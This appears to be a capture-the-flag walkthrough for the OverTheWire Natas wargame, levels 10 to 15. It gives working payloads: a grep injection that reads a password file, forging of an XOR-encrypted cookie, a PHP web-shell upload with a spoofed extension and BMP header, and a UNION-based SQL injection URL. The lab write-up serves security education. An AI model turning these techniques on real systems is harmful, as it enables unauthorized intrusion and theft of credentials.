## Level 10 - 11
This is pretty smart. Since filters have been added to prevent exploitation of linux scripting operators, we're instead going to exploit the use of the grep command. Since grep can accept multiple files, we need to guess a character that exists in the password and ignore all the hits it finds in the dictionary document. Fortunately, since we know the passwords tend to be a long alphanumeric string, we can try a bunch of numbers to get rid of most dictionary entries.

`8 /etc/natas_webpass/natas11`

## Level 11 - 12
Let's start by inspecting the code in our own editor. Line 67 clearly highlights our goal: we want the "showpassword" key of the cookie data to have value "yes".

Very imporant to note that the default data on line 13 is set as a cookie on line 55. This keeps the background color persistent between sessions.

This key-value pair for "showpassword" is only set at line 35, which is subject to a bunch of conditional statements. We can make the following observations:
- we have to input a valid regex-matching bgcolor in the form to trigger the code (line 34).
- Our cookie "data" key has to be manipulated through the encoding to have the properties we desire.

Now for the big problem: we need to crack the key on the XOR encoding. However, we can execute a known plaintext attack here because we can access our cookies to know what the cipher of our default data is.

The cookie has "data": "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw%3D". From the function in line 43, this is the default data > json_encode > xor_encrypt > base64_encoded. So to use it to reverse engineer the XOR key, we're going to have to base64_decode it first.

The key will be repeating due to the modulo used in the XOR encoding, so using the smallest repeating sequence, we can now generate a fake cookie base64 encoded data with field "showpassword": "yes".

## Level 12 - 13
We are immediately greeted with a file upload. Let's do a bit of testing! I found that the form does not check for the extension of the file being uploaded, so this suggests a file upload vulnerability where I can upload a script for the server the execute instead of a picture. Let's start by breaking down the code:

```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
```
genRandomString() generates a 10-character random string from lowercase letters and numbers 0-9.

```php
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```

makeRandomPath($dir, $ext) creates a file path of the concatenated $dir, a genRandomString and a file $ext.
It keeps trying random strings until it finds one that is available. 


```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```
This wrapper function creates the extension that we append in `makeRandomPath`. We find more information on the constant `PATHINFO_EXTENSION` [here](https://www.php.net/manual/en/fileinfo.constants.php). If we observe the input form at the bottom, we see that no matter what file we submit, a .jpg will be appended to the end. Therefore this constant will probably evaluate to a .jpg or .jpeg string literal, since it is based on the MIME type of the file we upload.

Finally, we move on to observing the script body: 
```php
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
// Do nothing, end of PHP code.
?> 

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

So we make a `$target_path` in the /upload directory with a generated 10-digit filename and the coerced .jpg extension. This also only succeeds if our file is successfully uploaded with <1kB size. 

Now let's define our objectives:
- We want to upload a script smaller than 1kB in size to fetch us the password of the password file located in `/etc/natas_webpass/natas13`.
- We need to find a way of working around the .jpg extension, so that the server will execute it as a script.

Let's start by making a basic script.
```php
<?php
echo 
?>
```

Let's work on getting a basic hello world script to run on the server. We observed that the `.jpg` extension is created by the `pathinfo` function, so in fact, we can get past it as long as we get the form submission to have the extension we desire. Maybe we can do this by intercepting the http request on its way to the server. Let's start up Burp.

We see that the form submits the file using a POST request in the body. Thankfully, since this isn't HTTPS, we can tamper freely. You'll see a random generated name for the file with the .jpg suffix. Change that to .php, and the upload should succeed, allowing us to run the file with the nice link they provided us with, giving us the password.

## Level 13 - 14
This looks like the same challenge as before, but as they hint, we now expect some kind of guard to check that our file is an image. Let's inspect the code. We see that this is implemented with a single additional conditional clause, and nothing more.

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
```

The [documentation](https://www.php.net/manual/en/function.exif-imagetype.php) for the `exif_imagetype()` function reveals that it returns some enumerated integer constants to represent the type of image it detected. We also see that it works by reading the first bytes of an image and checking its signature. So, we need some way to get this function to return a non-falsy value.

We could spoof some image types by adding a suitable magic number to the start of our PHP script source, but the easiest one is to notice that `exif_imagetype()` accepts BMP (bitmap) images, which all begin with the simple ASCII characters "BMP". This also makes the password output more readable as we know everything output after the BMP characters are our password. Therefore our script looks like this:
```php
BMP

<?php
echo file_get_contents("/etc/natas_webpass/natas14")
?>
```

Just following the same steps as we did before (spoofing the form-submitted file extension) will get us our password again.

## Level 14 - 15
Looks like a straightforward SQL injection! Looking at the code, we see a mysql query as expected. We first notice that all we have to do to get our password is execute a query that returns any entry:
```php
if(mysql_num_rows(mysql_query($query, $link)) > 0) {
    echo "Successful login! The password for natas15 is <censored><br>";
}
```

It's useful to note that the form is submitted by POST, so we can't see the query string. We note that there is a little bit of code that we can exploit to fine-tune our query:
```php
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
}
```

So, if we do our own GET request instead of the POST submitted by the form and add the `debug` parameter, we can see exactly which statement of ours gets executed. Finally, let's look at the query:
```sql
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
We want the query to simply return a tuple. We can escape the password with a quote and add a simple UNION statement to get what we want. Note that with the additional quote that gets added on the end, we want to add a trivial WHERE clause so that the query doesn't break.

Either do a GET request:

`http://natas14.natas.labs.overthewire.org/?debug&username=1&password=1%22+UNION+SELECT+*+from+users+where+%221%22+=+%221`

Or simply use this as the password in the form:

`a" union select * from users where "1" = "1`